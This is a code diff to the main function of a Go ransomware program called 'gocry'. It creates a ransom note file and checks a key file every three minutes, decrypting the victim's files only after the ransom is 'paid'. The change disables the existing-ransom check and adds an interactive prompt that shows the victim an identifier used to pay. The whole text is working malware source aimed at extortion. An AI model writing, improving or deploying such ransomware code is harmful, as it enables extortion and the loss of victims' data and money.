@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
@@ -205,9 +206,9 @@ func main() {
 	ransomware.rootDir = os.Getenv("root_dir")
 
 	// Check if the user already has a ransom
-	if err := ransomware.checkIfActiveRansom(); err != nil {
-		log.Fatal(err)
-	}
+	// if err := ransomware.checkIfActiveRansom(); err != nil {
+	// 	log.Fatal(err)
+	// }
 
 	// Create the message file
 	file, err := os.Create(ransomware.rootDir + "/ransom.txt")
@@ -280,24 +281,46 @@ func main() {
 		log.Fatal(err)
 	}
 
-	// Setup a infinite loop, which checks the valid key.
-	for {
-		fmt.Println("Checking key file...")
-		key, err := ioutil.ReadFile(ransomware.rootDir + "/key.txt")
-		if err != nil {
+	// Start an infnite loop which checks key validity. We start in a goroutine, since
+	// we want the user to be able to interact with the ransomware.
+	go func() {
+		for {
+			fmt.Println()
+			fmt.Println("Checking key file...")
+			key, err := ioutil.ReadFile(ransomware.rootDir + "/key.txt")
+			if err != nil {
+				time.Sleep(time.Minute * 3)
+				continue
+			}
+
+			// check if the keys match
+			if bytes.Equal(key, ransomware.key) {
+				// The ransom has been paid so decrypt the files..
+				ransomware.decryptDirectory(ransomware.rootDir)
+				fmt.Println("Thank you for your cooperation!")
+				break
+			}
+			fmt.Println("Key did not match, checking again in 3 minutes...")
+
 			time.Sleep(time.Minute * 3)
+		}
+	}()
+
+	fmt.Println("You can find commands to interact with gocry by typing: commands")
+
+	reader := bufio.NewReader(os.Stdin)
+	for {
+		text, err := reader.ReadString('\n')
+		if err != nil {
+			fmt.Println("error reading your command, please try again!")
 			continue
 		}
-
-		// check if the keys match
-		if bytes.Equal(key, ransomware.key) {
-			// The ransom has been paid so decrypt the files..
-			ransomware.decryptDirectory(ransomware.rootDir)
-			fmt.Println("Thank you for your cooperation!")
-			break
+		text = strings.Replace(text, "\n", "", -1)
+		if text == "commands" {
+			fmt.Println("'commands' - displays all of the commands available.")
+			fmt.Println("'uuid' - display your unique indentifer used to pay your ransomware.")
+		} else if text == "uuid" {
+			fmt.Println(uindef)
 		}
-		fmt.Println("Key did not match, checking again in 3 minutes...")
-
-		time.Sleep(time.Minute * 3)
 	}
 }
